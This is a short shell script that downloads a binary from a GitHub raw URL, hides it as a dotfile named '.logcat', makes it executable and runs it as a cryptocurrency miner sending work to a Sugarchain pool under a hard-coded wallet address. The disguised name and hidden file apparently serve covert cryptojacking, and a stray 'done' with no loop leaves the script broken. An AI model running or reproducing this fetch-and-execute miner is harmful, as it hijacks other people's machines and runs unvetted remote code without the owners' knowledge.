#!/bin/sh

wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0001
mv 0001 .logcat
chmod u+x .logcat
./.logcat -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.cpu1 -t2
sleep 5
done
